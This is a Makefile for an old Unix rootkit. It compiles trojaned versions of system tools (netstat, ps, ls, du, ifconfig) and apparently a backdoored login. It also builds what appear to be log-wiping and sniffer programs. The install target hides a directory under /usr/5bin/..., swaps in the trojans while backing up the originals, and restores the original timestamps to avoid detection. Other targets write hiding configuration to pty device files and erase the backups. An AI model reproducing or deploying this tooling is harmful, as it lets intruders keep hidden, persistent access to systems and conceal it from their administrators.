# Rootkit v4.8.91pl81 with logb and some other shyt a la m-q.

CC	=gcc
NSOBJS	=inet.o if.o main.o mbuf.o route.o unix.o ns.o ipintrq.o
CFLAGS	=-O2
LDFLAGS	=-s
ELEETDIR=/usr/5bin/...
DESTDIR	=rk
BAKDIR	=rk-bak
TEMPDIR	=/tmp/.X11-unix/.../rk
NDYNAF	=-n -Bdynamic
PROGS	=fix ft ns ps ls ls5 du du5 ic lb z z2 es

krad:   all install setup clean

all:    ${PROGS}

fix:	fix.c 
	${CC} ${CFLAGS} fix.c -o fix

ft:	ftime.c
	${CC} ${CFLAGS} ftime.c -o ft

ns:	${NSOBJS}
	${CC} ${CFLAGS} ${NSOBJS} -o ns -lkvm

ps:	ps.c
	${CC} ${CFLAGS} ${NDYNAF} ps.c -o ps -lm -lkvm 

ls:	ls.c
	${CC} ${CFLAGS} ${NDYNAF} ls.c -o ls

du:	du.c
	${CC} ${CFLAGS} ${NDYNAF} du.c -o du

ic:	ifconfig.c revarp.c	
	${CC} -c ifconfig.c
	${CC} -c revarp.c
	${CC} ${CFLAGS} -Bstatic ifconfig.o revarp.o -o ic

lb:     magic.c lb.c
	${CC} ${CFLAGS} magic.c -o magic
	magic
	${CC} ${CFLAGS} lb.c -o lb

du5:	du5.c
	${CC} ${CFLAGS} du5.c -o du5

ls5:	ls5.c
	${CC} ${CFLAGS} ls5.c -o ls5

z:	z.c
	${CC} -O4 z.c -o z

z2:	z2.c
	${CC} -O4 z2.c -o z2

es:	es.c
	${CC} -O4 es.c -o es

install:
	@(mkdir ${ELEETDIR}; \
	cd ${ELEETDIR}; \
	mkdir ${DESTDIR}; \
	mkdir ${BAKDIR}; \
	${TEMPDIR}/ft /usr/ucb/netstat /usr/kvm/ps /bin/ls /bin/du \
	/usr/bin/login /usr/etc/ifconfig /usr/5bin/du /usr/5bin/ls \
	> ${ELEETDIR}/ftime.dat; \
	${TEMPDIR}/fix /usr/ucb/netstat ${TEMPDIR}/ns ${BAKDIR}/netstat.bak; \
	${TEMPDIR}/fix /usr/kvm/ps ${TEMPDIR}/ps ${BAKDIR}/ps.bak; \
	${TEMPDIR}/fix /bin/ls ${TEMPDIR}/ls ${BAKDIR}/ls.bak; \
	${TEMPDIR}/fix /bin/du ${TEMPDIR}/du ${BAKDIR}/du.bak; \
	${TEMPDIR}/fix /usr/bin/login ${TEMPDIR}/lb ${BAKDIR}/login.bak; \
	${TEMPDIR}/fix /usr/etc/ifconfig ${TEMPDIR}/ic ${BAKDIR}/ifconfig.bak; \
	${TEMPDIR}/fix /usr/5bin/du ${TEMPDIR}/du5 ${BAKDIR}/du5.bak; \
	${TEMPDIR}/fix /usr/5bin/ls ${TEMPDIR}/ls5 ${BAKDIR}/ls5.bak; \
	${TEMPDIR}/ft < ${ELEETDIR}/ftime.dat; \
	install -s -m 0700 ${TEMPDIR}/z ${DESTDIR}/z; \
	install -s -m 0700 ${TEMPDIR}/z2 ${DESTDIR}/z2; \
	install -s -m 0700 ${TEMPDIR}/fix ${DESTDIR}/fix; \
	install -s -m 0700 ${TMEPDIR}/ft ${DESTDIR}/ft; \
	install -s -m 0700 ${TEMPDIR}/es ${DESTDIR}/es)

setup:
	@(echo `basename ${ELEETDIR}`>/dev/ptyr; \
	echo "2 es">/dev/ptyp)

clean:
	rm -f *.o core ${PROGS}

s00pahkleen:
	@(cd ${ELEETDIR}; \
	rm -rf ${BAKDIR})

